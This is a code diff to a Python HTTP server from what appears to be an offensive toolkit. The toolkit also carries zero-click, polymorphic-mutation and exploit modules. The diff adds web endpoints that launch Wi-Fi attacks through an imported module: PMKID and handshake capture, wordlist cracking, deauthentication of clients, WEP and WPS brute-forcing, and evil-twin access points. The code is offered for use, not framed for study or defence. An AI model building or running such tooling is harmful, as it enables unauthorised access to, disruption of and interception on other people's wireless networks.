@@ -86,6 +86,12 @@ try:
 except ImportError:
     _ZC_OK = False
 
+try:
+    import wifi_attack as _wifi_mod
+    _WIFI_OK = True
+except ImportError:
+    _WIFI_OK = False
+
 # ── Per-request polymorphic mutation cache ────────────────────────────────────
 _POLY_CACHE: dict = {}          # fname -> (mtime, mutated_bytes)
 _POLY_LOCK  = threading.Lock()
@@ -1331,6 +1337,109 @@ class H(BaseHTTPRequestHandler):
                 self._send(str(result), "text/plain")
             else:
                 self._send("zero_click module not available", "text/plain")
+            return
+
+        # ── WiFi attack endpoints ─────────────────────────────────────────────
+        if path.startswith("/wifi"):
+            sub = path[5:].lstrip("/")  # e.g. "scan", "pmkid", "auto", etc.
+            iface   = qs.get("iface",   ["wlan0"])[0]
+            bssid   = qs.get("bssid",   [None])[0]
+            channel = qs.get("channel", ["6"])[0]
+            essid   = qs.get("ssid",    ["target"])[0]
+            wl      = qs.get("wordlist", ["/usr/share/wordlists/rockyou.txt"])[0]
+            dur     = int(qs.get("duration", ["15"])[0])
+            if not sub or sub == "help":
+                self._send(
+                    "WiFi Attack Endpoints:\n"
+                    "  /wifi/scan?iface=wlan0&duration=15\n"
+                    "  /wifi/auto?iface=wlan0&wordlist=/path/rockyou.txt\n"
+                    "  /wifi/pmkid?iface=wlan0mon&bssid=AA:BB&duration=60\n"
+                    "  /wifi/handshake?iface=wlan0mon&bssid=AA:BB&channel=6&ssid=NAME\n"
+                    "  /wifi/crack?cap=/tmp/file.cap&wordlist=/path/rockyou.txt&bssid=AA:BB\n"
+                    "  /wifi/deauth?iface=wlan0mon&bssid=AA:BB[&client=MAC]\n"
+                    "  /wifi/wep?iface=wlan0mon&bssid=AA:BB&channel=6\n"
+                    "  /wifi/wps?iface=wlan0mon&bssid=AA:BB&channel=6\n"
+                    "  /wifi/evil_twin?iface=wlan0&ssid=NAME&channel=6\n",
+                    "text/plain"
+                )
+                return
+            if _WIFI_OK:
+                try:
+                    kwargs = {"iface": iface}
+                    if sub == "scan":
+                        result = _wifi_mod.scan_networks(iface, duration=dur)
+                        lines = [f"{n['bssid']}  ch{n['channel']}  {n['encryption']}  {n['power']}dBm  {n['essid']}"
+                                 for n in result]
+                        self._send("\n".join(lines) or "No networks found", "text/plain")
+                    elif sub == "auto":
+                        threading.Thread(
+                            target=_wifi_mod.auto_attack,
+                            kwargs={"iface": iface, "wordlist": wl, "duration": dur},
+                            daemon=True
+                        ).start()
+                        self._send(f"[*] auto_attack started on {iface}", "text/plain")
+                    elif sub == "pmkid":
+                        threading.Thread(
+                            target=_wifi_mod.pmkid_attack,
+                            kwargs={"mon_iface": iface, "bssid": bssid,
+                                    "duration": dur, "wordlist": wl},
+                            daemon=True
+                        ).start()
+                        self._send(f"[*] PMKID attack started on {iface}", "text/plain")
+                    elif sub == "handshake":
+                        threading.Thread(
+                            target=_wifi_mod.capture_handshake,
+                            kwargs={"mon_iface": iface, "bssid": bssid,
+                                    "channel": channel, "essid": essid},
+                            daemon=True
+                        ).start()
+                        self._send(f"[*] Handshake capture started", "text/plain")
+                    elif sub == "crack":
+                        cap = qs.get("cap", [f"/tmp/wizza_hs_{(bssid or '').replace(':','')}-01.cap"])[0]
+                        threading.Thread(
+                            target=_wifi_mod.crack_handshake,
+                            kwargs={"cap_file": cap, "wordlist": wl, "bssid": bssid},
+                            daemon=True
+                        ).start()
+                        self._send(f"[*] Cracking {cap}", "text/plain")
+                    elif sub == "deauth":
+                        client = qs.get("client", [None])[0]
+                        threading.Thread(
+                            target=_wifi_mod.deauth,
+                            kwargs={"mon_iface": iface, "bssid": bssid, "client_mac": client},
+                            daemon=True
+                        ).start()
+                        self._send(f"[*] Deauth started → {bssid}", "text/plain")
+                    elif sub == "wep":
+                        threading.Thread(
+                            target=_wifi_mod.wep_crack,
+                            kwargs={"mon_iface": iface, "bssid": bssid, "channel": channel},
+                            daemon=True
+                        ).start()
+                        self._send(f"[*] WEP attack started", "text/plain")
+                    elif sub == "wps":
+                        threading.Thread(
+                            target=_wifi_mod.wps_attack,
+                            kwargs={"iface": iface, "bssid": bssid, "channel": channel},
+                            daemon=True
+                        ).start()
+                        self._send(f"[*] WPS brute-force started", "text/plain")
+                    elif sub == "evil_twin":
+                        ap2 = qs.get("ap_iface", [iface])[0]
+                        mon2 = qs.get("mon_iface", [None])[0]
+                        threading.Thread(
+                            target=_wifi_mod.evil_twin,
+                            kwargs={"ap_iface": ap2, "mon_iface": mon2,
+                                    "ssid": essid, "channel": int(channel)},
+                            daemon=True
+                        ).start()
+                        self._send(f"[*] Evil twin AP '{essid}' started", "text/plain")
+                    else:
+                        self._send(f"Unknown wifi action: {sub}", "text/plain")
+                except Exception as e:
+                    self._send(f"[!] WiFi error: {e}", "text/plain")
+            else:
+                self._send("wifi_attack module not available", "text/plain")
             return
 
         # ── Exploit module index ──────────────────────────────────────────────
